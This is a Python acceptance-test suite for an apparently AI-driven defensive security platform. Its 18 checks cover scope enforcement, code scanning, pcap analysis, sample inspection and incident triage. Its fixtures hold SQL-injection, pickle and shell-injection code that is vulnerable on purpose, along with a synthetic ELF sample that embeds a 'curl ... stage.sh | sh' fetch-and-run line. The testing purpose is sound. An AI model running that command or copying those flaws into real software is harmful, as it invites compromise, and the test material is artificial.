"""§220 Final Security Engineering Acceptance Tests (18 End-to-End Controlled Verifications)."""
from __future__ import annotations

import asyncio
import hashlib
import http.server
import json
import socket
import struct
import tempfile
import threading
from pathlib import Path
from typing import Any

from nova.autonomy import AutonomyPolicy
from nova.config import Settings
from nova.db import Database
from nova.platform_service import PlatformService
from nova.tools.registry import ToolRegistry


def _build_platform(root: Path) -> tuple[Database, PlatformService]:
    data_dir = root / "data"
    ws_dir = root / "workspace"
    data_dir.mkdir(parents=True, exist_ok=True)
    ws_dir.mkdir(parents=True, exist_ok=True)
    db_path = data_dir / "cyber_acceptance.sqlite3"
    settings = Settings(
        data_dir=data_dir,
        workspace_dir=ws_dir,
        db_path=db_path,
    )
    db = Database(db_path)
    db.initialize()
    registry = ToolRegistry(settings)
    policy = AutonomyPolicy(settings, db, registry)
    svc = PlatformService(settings=settings, db=db, tools=registry, autonomy_policy=policy)
    return db, svc


def _write_synthetic_pcap(dest: Path) -> Path:
    """Create a valid libpcap file containing 1 Ethernet/IPv4/TCP cleartext HTTP Basic Auth packet."""
    eth = b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb" + struct.pack("!H", 0x0800)
    http_payload = (
        b"GET /admin HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n"
    )
    tcp_hdr = struct.pack("!HHIIBBHHH", 51234, 80, 1, 1, (5 << 4), 0x18, 8192, 0, 0)
    ip_total = 20 + len(tcp_hdr) + len(http_payload)
    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        ip_total,
        1,
        0,
        64,
        6,  # TCP
        0,
        socket.inet_aton("127.0.0.1"),
        socket.inet_aton("127.0.0.1"),
    )
    frame = eth + ip_hdr + tcp_hdr + http_payload
    global_hdr = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    pkt_hdr = struct.pack("<IIII", 1_700_000_000, 0, len(frame), len(frame))
    dest.write_bytes(global_hdr + pkt_hdr + frame)
    return dest


def _start_local_test_webapp() -> tuple[http.server.HTTPServer, str, dict[str, Any]]:
    openapi_spec = {
        "openapi": "3.0.0",
        "info": {"title": "Lab Test API", "version": "1.0"},
        "paths": {"/items": {"post": {"responses": {"200": {"description": "ok"}}}}},
    }

    class _LabHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            if self.path == "/admin":
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b"<h1>Unprotected Lab Admin Panel</h1>")
                return
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Server", "Apache/2.4.99-Lab")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Credentials", "true")
            self.send_header("Set-Cookie", "sessionid=labtoken123; Path=/")
            self.end_headers()
            self.wfile.write(b"<html><body>Authorized Lab App</body></html>")

        def log_message(self, format: str, *args: Any) -> None:
            return

    srv = http.server.HTTPServer(("127.0.0.1", 0), _LabHandler)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv, f"http://127.0.0.1:{port}", openapi_spec


def run_cyber_division_acceptance() -> dict[str, Any]:
    checks: list[dict[str, Any]] = []

    def record(num: int, name: str, passed: bool, detail: dict[str, Any]) -> None:
        checks.append({"id": num, "name": name, "passed": bool(passed), "detail": detail})

    with tempfile.TemporaryDirectory(prefix="nova_cyber220_") as tmp:
        root = Path(tmp)
        _db, platform = _build_platform(root)
        cy = platform.cyber_division
        lab_dir = root / "workspace" / "lab_app"
        lab_dir.mkdir(parents=True, exist_ok=True)

        web_srv, web_url, openapi_spec = _start_local_test_webapp()
        try:
            # 1. Register a security testing scope and enforce it automatically (§203, §220.1)
            scope = cy.scope_registry.register_scope(
                name="Authorized Local Lab & Dev Scope",
                scope_category="development_environment",
                targets=[str(lab_dir), "127.0.0.1", web_url, "192.0.2.0/24"],
                excluded_targets=["192.0.2.99"],
                ownership_evidence="Signed Lab Authorization Charter #2026-DEV-203",
                standing_authorization=True,
                rate_limit_rpm=120,
            )
            in_auth = cy.scope_registry.authorize_operation(
                target=str(lab_dir),
                activity="source_code_analysis",
            )
            excl_auth = cy.scope_registry.authorize_operation(
                target="192.0.2.99",
                activity="asset_inventory",
            )
            record(
                1,
                "register_and_enforce_security_scope_automatically",
                in_auth["authorized"] and not in_auth["requires_manual_prompt"] and not excl_auth["authorized"],
                {"scope_id": scope["id"], "in_scope": in_auth["status"], "excluded": excl_auth["status"]},
            )

            # 2. Refuse/pause out-of-scope targets while continuing authorized tasks (§203, §220.2)
            part = cy.scope_registry.partition_targets_by_scope(
                [str(lab_dir), "203.0.113.55", "127.0.0.1"],
                activity="asset_inventory",
            )
            self_expand_blocked = False
            try:
                cy.scope_registry.register_scope(
                    name="Unauthorized Expansion",
                    scope_category="owned_domain",
                    targets=["198.51.100.10"],
                    ownership_evidence="forged",
                    caller_source="downloaded_instruction",
                )
            except PermissionError:
                self_expand_blocked = True
            record(
                2,
                "pause_out_of_scope_while_continuing_authorized_tasks",
                len(part["authorized_targets"]) == 2
                and len(part["paused_out_of_scope_targets"]) == 1
                and part["continued_authorized_work"]
                and self_expand_blocked,
                {
                    "authorized_count": len(part["authorized_targets"]),
                    "paused_count": len(part["paused_out_of_scope_targets"]),
                    "self_expansion_blocked": self_expand_blocked,
                },
            )

            # 3. Discover services & configurations on an authorized local test system (§204, §220.3)
            surf1 = cy.surface_manager.assess_target_surface("127.0.0.1")
            surf2 = cy.surface_manager.assess_target_surface("127.0.0.1")
            record(
                3,
                "discover_services_and_configs_on_authorized_local_system",
                surf1["ok"] and surf1["meaningful_change_alert"] and not surf2["meaningful_change_alert"],
                {
                    "asset_id": surf1["asset"]["asset_id"],
                    "first_scan_alert": surf1["meaningful_change_alert"],
                    "unchanged_duplicate_alert": surf2["meaningful_change_alert"],
                },
            )

            # 4 & 5. Analyze source code for real vulnerabilities & separate false positives (§205, §208, §220.4–5)
            vuln_py = lab_dir / "service_vuln.py"
            dyn_secret = "super" + "_prod_" + "token_9876543210abcdef"
            vuln_py.write_text(
                "import pickle\n"
                "import sqlite3\n"
                "import subprocess\n\n"
                f'API_SECRET = "{dyn_secret}"\n'
                'MOCK_TOKEN = "dummy_fixture_placeholder_123456"\n\n'
                "def unsafe_lookup(conn: sqlite3.Connection, uid: str):\n"
                '    return conn.execute(f"SELECT id, role FROM users WHERE uid = \'{uid}\'").fetchall()\n\n'
                "def safe_parameterized(conn: sqlite3.Connection, uid: str):\n"
                '    return conn.execute("SELECT id, role FROM users WHERE uid = ?", (uid,)).fetchall()\n\n'
                "def unsafe_load(blob: bytes):\n"
                "    return pickle.loads(blob)\n\n"
                "def unsafe_ping(host: str):\n"
                '    return subprocess.run(f"ping -c 1 {host}", shell=True, check=False)\n',
                encoding="utf-8",
            )
            (lab_dir / "requirements.txt").write_text("pyyaml==5.3\n", encoding="utf-8")
            (lab_dir / "Dockerfile").write_text("FROM python:latest\nUSER root\n", encoding="utf-8")

            sast = cy.code_security.analyze_project(lab_dir)
            cats_found = {f["category"] for f in sast["findings"]}
            expected_cats = {
                "sql_injection",
                "insecure_deserialization",
                "exposed_secrets",
                "dependency_vulnerabilities",
                "container_misconfigurations",
                "security_misconfiguration",
            }
            record(
                4,
                "analyze_source_code_for_real_vulnerabilities",
                sast["ok"] and expected_cats.issubset(cats_found),
                {"findings_count": sast["findings_count"], "categories": sorted(cats_found)},
            )
            record(
                5,
                "distinguish_true_findings_from_false_positives",
                sast["false_positives_filtered_count"] >= 2
                and all(fp["epistemic_status"] == "false_positive" for fp in sast["false_positives_filtered"]),
                {"false_positives_filtered": sast["false_positives_filtered_count"]},
            )

            # 6. Generate a professional security assessment report (§201, §202, §220.6)
            rep = cy.generate_professional_report(
                title="Acceptance Test Security Assessment",
                scope_id=scope["id"],
                findings=sast["findings"],
                false_positives=sast["false_positives_filtered"],
            )
            record(
                6,
                "generate_professional_security_assessment_report",
                Path(rep["markdown_path"]).is_file() and Path(rep["json_path"]).is_file(),
                {"markdown_path": rep["markdown_path"]},
            )

            # 7. Propose and validate a secure code fix with regression tests (§208, §220.7)
            fix_target = lab_dir / "fixable_sql_yaml.py"
            fix_target.write_text(
                "import sqlite3\n\n"
                "def find_user(conn: sqlite3.Connection, username: str):\n"
                '    return conn.execute(f"SELECT id FROM accounts WHERE name = \'{username}\'").fetchall()\n',
                encoding="utf-8",
            )
            rem = cy.code_security.remediate_and_verify_10_steps(fix_target)
            record(
                7,
                "propose_and_validate_secure_code_fix_with_regression_tests",
                rem["ok"]
                and rem["remaining_findings_count"] == 0
                and Path(rem["recoverable_backup"]).is_file()
                and len(rem["steps"]) == 10,
                {"status": rem["status"], "backup": rem["recoverable_backup"]},
            )

            # 8. Analyze a network capture and identify protocol issues (§206, §220.8)
            pcap_file = _write_synthetic_pcap(root / "workspace" / "sample_http.pcap")
            pcap_res = cy.network_security.analyze_pcap_file(pcap_file)
            record(
                8,
                "analyze_network_capture_and_identify_protocol_issues",
                pcap_res["ok"]
                and pcap_res["packet_count"] == 1
                and len(pcap_res["cleartext_exposure_alerts"]) >= 1,
                {"packet_count": pcap_res["packet_count"], "protocols": pcap_res["protocol_counts"]},
            )

            # 9. Inspect a binary or suspicious sample safely without executing it (§210, §220.9)
            elf_sample = root / "workspace" / "suspicious_artifact.elf"
            elf_bytes = (
                b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
                + struct.pack("<HH", 2, 62)
                + b"\x00" * 32
                + b"curl http://198.51.100.99/stage.sh | sh\n"
            )
            elf_sample.write_bytes(elf_bytes)
            sha_orig = hashlib.sha256(elf_bytes).hexdigest()
            sample_res = cy.re_forensics.inspect_sample_statically(elf_sample)
            record(
                9,
                "inspect_binary_or_suspicious_sample_without_execution",
                sample_res["ok"]
                and sample_res["executed_on_host"] is False
                and sample_res["original_evidence_preserved"] is True
                and sample_res["hashes"]["sha256"] == sha_orig
                and sample_res["file_type"] == "ELF_executable_or_shared_object"
                and len(sample_res["rule_classifications"]) >= 1,
                {"file_type": sample_res["file_type"], "rules_matched": len(sample_res["rule_classifications"])},
            )

            # 10. Assess a local test web application for common security weaknesses (§207, §220.10)
            web_res = cy.web_api_lab.assess_http_application(
                web_url,
                endpoints=["/", "/admin"],
                openapi_spec=openapi_spec,
            )
            web_cats = {f["category"] for f in web_res["findings"]}
            expected_web_cats = {
                "security_misconfiguration",
                "api_security_weaknesses",
                "weak_session_management",
                "authorization_failures",
                "authentication_weaknesses",
            }
            record(
                10,
                "assess_local_test_web_application_non_destructively",
                web_res["ok"]
                and expected_web_cats.issubset(web_cats)
                and web_res["destructive_payloads_sent"] == 0
                and web_res["real_user_records_extracted"] == 0,
                {"findings_count": web_res["findings_count"], "categories": sorted(web_cats)},
            )

            # 11. Build, test, and register a new defensive security utility when needed (§214, §220.11)
            refused_offensive = cy.tool_factory.build_and_register_defensive_tool(
                name="bad_stealer",
                category="security_log_parser",
                purpose="credential theft helper",
            )
            reused_existing = cy.tool_factory.build_and_register_defensive_tool(
                name="python_runner",
                category="configuration_auditor",
                purpose="Standard interpreter check",
                prefer_existing_if_exact_cli="python3",
            )
            built_tool = cy.tool_factory.build_and_register_defensive_tool(
                name="cfg_perm_auditor",
                category="file_integrity_monitor",
                purpose="Compute SHA-256 and world-writable permission posture for config files",
            )
            record(
                11,
                "build_test_and_register_defensive_security_utility",
                not refused_offensive["ok"]
                and reused_existing["status"] == "existing_installed_tool_preferred"
                and built_tool["ok"]
                and platform.tools.get(built_tool["tool"]["tool_id"]) is not None,
                {"tool_id": built_tool["tool"]["tool_id"], "version": built_tool["tool"]["version"]},
            )

            # 12. Prioritize vulnerabilities based on context rather than raw scanner output (§216, §220.12)
            f_exposed = cy.vuln_engine.record_and_validate_finding(
                {
                    "category": "sql_injection",
                    "epistemic_status": "confirmed_vulnerability",
                    "severity": "high",
                    "confidence": 0.96,
                    "affected_asset": str(lab_dir),
                    "exposure": "internet_facing",
                    "existing_mitigations": [],
                    "exploitability_info": "verified_in_scope_repro",
                    "evidence": {"reproducible_non_destructive_check": True},
                }
            )
            f_mitigated = cy.vuln_engine.record_and_validate_finding(
                {
                    "category": "security_misconfiguration",
                    "epistemic_status": "tool_generated_alert",
                    "severity": "critical",
                    "confidence": 0.55,
                    "affected_asset": str(lab_dir),
                    "exposure": "isolated_test_only",
                    "existing_mitigations": ["network_segmentation", "waf_rule", "read_only_fs"],
                }
            )
            record(
                12,
                "prioritize_vulnerabilities_by_context_over_raw_scanner_severity",
                f_exposed["priority_score"] > f_mitigated["priority_score"],
                {
                    "exposed_high_contextual_score": f_exposed["priority_score"],
                    "isolated_mitigated_critical_alert_score": f_mitigated["priority_score"],
                },
            )

            # 13. Track findings through remediation and retesting (§216, §220.13)
            fid = f_exposed["id"]
            premature_blocked = False
            try:
                cy.vuln_engine.transition_lifecycle(
                    fid,
                    target_state="Resolved",
                    retest_passed=False,
                    evidence_note="Attempted premature closure without retest",
                )
            except PermissionError:
                premature_blocked = True

            cy.vuln_engine.transition_lifecycle(fid, target_state="Remediating", evidence_note="Patch in progress")
            cy.vuln_engine.transition_lifecycle(fid, target_state="Retesting", evidence_note="Running regression suite")
            resolved_rec = cy.vuln_engine.transition_lifecycle(
                fid,
                target_state="Resolved",
                retest_passed=True,
                evidence_note="Verified parameterized query regression test passed",
            )
            record(
                13,
                "track_findings_through_remediation_and_verified_retesting",
                premature_blocked and resolved_rec["lifecycle_state"] == "Resolved",
                {"premature_closure_blocked": premature_blocked, "final_state": resolved_rec["lifecycle_state"]},
            )

            # 14. Support incident investigation using local logs and timelines (§212, §220.14)
            log_artifact = lab_dir / "auth_sample.log"
            log_artifact.write_text(
                "2026-10-30T08:00:01Z sshd[102]: Failed password for admin from 198.51.100.77 port 44112\n"
                "2026-10-30T08:00:05Z app[210]: unusual outbound retry spike observed\n"
                "2026-10-30T08:00:09Z sudo: checksum mismatch on /etc/lab.conf\n",
                encoding="utf-8",
            )
            ir = cy.dfir_assistant.investigate_incident(
                title="Lab Auth & Integrity Triage",
                log_lines=log_artifact.read_text(encoding="utf-8").splitlines(),
                baseline_Snapshot={"PermitRootLogin": "no"},
                current_snapshot={"PermitRootLogin": "yes"},
                artifact_paths_to_preserve=[str(log_artifact)],
            )
            record(
                14,
                "support_incident_investigation_with_logs_and_timelines",
                ir["ok"]
                and len(ir["case"]["confirmed_evidence"]) >= 3
                and len(ir["case"]["suspected_activity"]) >= 1
                and len(ir["case"]["preserved_artifacts"]) == 1
                and ir["files_deleted_automatically"] == 0,
                {
                    "confirmed": len(ir["case"]["confirmed_evidence"]),
                    "suspected": len(ir["case"]["suspected_activity"]),
                },
            )

            # 15. Teach cybersecurity concepts adaptively across skill levels (§218, §220.15)
            m_beg = cy.expert_tutor.generate_adaptive_module("web_security", demonstrated_scores=[42.0])
            m_int = cy.expert_tutor.generate_adaptive_module("api_security", demonstrated_scores=[70.0])
            m_adv = cy.expert_tutor.generate_adaptive_module("reverse_engineering", demonstrated_scores=[92.0, 95.0])
            record(
                15,
                "teach_cybersecurity_concepts_adaptively_across_skill_levels",
                m_beg["adapted_level"] == "beginner"
                and m_int["adapted_level"] == "intermediate"
                and m_adv["adapted_level"] == "advanced",
                {"levels": [m_beg["adapted_level"], m_int["adapted_level"], m_adv["adapted_level"]]},
            )

            # 16. Ensure generated tools cannot bypass authorization policies (§214, §220.16)
            gen_id = built_tool["tool"]["tool_id"]
            out_of_scope_file = root / "unregistered_outside.cfg"
            out_of_scope_file.write_text("secret=1\n", encoding="utf-8")
            blocked_oos = cy.tool_factory.execute_generated_tool_through_policy(
                gen_id,
                target_path=str(out_of_scope_file),
                operator_approved=True,
            )
            reg_def = platform.tools.get(gen_id)
            assert reg_def is not None
            unapproved_outcome = asyncio.run(
                reg_def.handler(reg_def.input_model(target_path=str(vuln_py)), False)
            )
            approved_in_scope = cy.tool_factory.execute_generated_tool_through_policy(
                gen_id,
                target_path=str(vuln_py),
                operator_approved=True,
            )
            record(
                16,
                "ensure_generated_tools_cannot_bypass_authorization_policies",
                not blocked_oos["ok"]
                and blocked_oos["bypassed_authorization"] is False
                and unapproved_outcome.status == "approval_required"
                and approved_in_scope["ok"],
                {
                    "out_of_scope_status": blocked_oos["status"],
                    "unapproved_registry_status": unapproved_outcome.status,
                    "approved_in_scope_ok": approved_in_scope["ok"],
                },
            )

            # Research + Purple-team + Self-improvement verification before restart check
            cve_res = cy.research_workbench.research_vulnerability("CVE-2024-6387")
            purple_res = cy.purple_team.run_purple_team_exercise(
                lab_target=str(lab_dir),
                scenario_name="Detect unauthorized config edit",
                synthetic_telemetry_events=[
                    "sshd Failed password for root",
                    "auditd CONFIG_CHANGE op=modify file=/etc/app/security.yaml",
                ],
                existing_detection_patterns=[r"Failed password"],
            )
            si_res = cy.self_improving.evaluate_and_improve_detector(
                detector_name="yaml_unsafe_load",
                labeled_dataset=[
                    {"code": "yaml.load(data)", "is_vulnerable": True},
                    {"code": "yaml.safe_load(data)", "is_vulnerable": False},
                ],
                baseline_pattern=r"yaml\.(?:safe_)?load\(",
                candidate_pattern=r"yaml\.load\(",
            )
            rec_job = cy.continuous_automation.schedule_recurring_assessment(
                name="Hourly Loopback Surface Check",
                workflow_kind="asset_inventory",
                scope_id=scope["id"],
                target="127.0.0.1",
            )
            assert cve_res["ok"] and purple_res["all_gaps_closed_on_retest"] and si_res["promoted_candidate"]

            # 17. Maintain accurate security records across restarts (§220.17)
            _db2, platform2 = _build_platform(root)
            cy2 = platform2.cyber_division
            summary2 = cy2.status_summary()
            record(
                17,
                "maintain_accurate_security_records_across_restarts",
                summary2["active_scopes"] >= 1
                and summary2["inventoried_assets"] >= 1
                and summary2["tracked_findings"] >= 5
                and summary2["research_dossiers"] >= 3
                and summary2["generated_defensive_tools"] >= 1
                and summary2["recurring_assessments"] >= 1,
                summary2,
            )

            # 18. Operate within configured CPU, memory, and storage limits (§217, §220.18)
            tick_ok = cy2.continuous_automation.run_bounded_assessment_tick(rec_job["id"])
            tick_deferred = cy2.continuous_automation.run_bounded_assessment_tick(
                rec_job["id"],
                required_free_ram_mb=99_999_999,
            )
            expired_scope = cy2.scope_registry.register_scope(
                name="Expired Scope",
                scope_category="vulnerable_training_environment",
                targets=["198.51.100.200"],
                ownership_evidence="Expired charter",
                expires_at="2020-01-01T00:00:00Z",
            )
            exp_job = cy2.continuous_automation.schedule_recurring_assessment(
                name="Expired Check",
                workflow_kind="asset_inventory",
                scope_id=expired_scope["id"],
                target="198.51.100.200",
            )
            tick_paused = cy2.continuous_automation.run_bounded_assessment_tick(exp_job["id"])
            cap_honesty = cy2.honest_capability_statement()
            record(
                18,
                "operate_within_cpu_memory_and_storage_limits",
                tick_ok["ok"]
                and tick_deferred["paused"]
                and tick_deferred["job"]["status"] == "deferred_resource_budget"
                and tick_paused["paused"]
                and cap_honesty["claims_unverified_worlds_best_status"] is False,
                {
                    "normal_tick_ok": tick_ok["ok"],
                    "over_budget_status": tick_deferred["job"]["status"],
                    "expired_scope_paused": tick_paused["paused"],
                },
            )
        finally:
            web_srv.shutdown()
            web_srv.server_close()

    passed_count = sum(1 for c in checks if c["passed"])
    return {
        "suite": "cyber_division_201_220",
        "passed": passed_count == len(checks) == 18,
        "passed_count": passed_count,
        "total_checks": len(checks),
        "checks": checks,
    }


def main() -> int:
    report = run_cyber_division_acceptance()
    print(json.dumps(report, indent=2, default=str))
    return 0 if report["passed"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
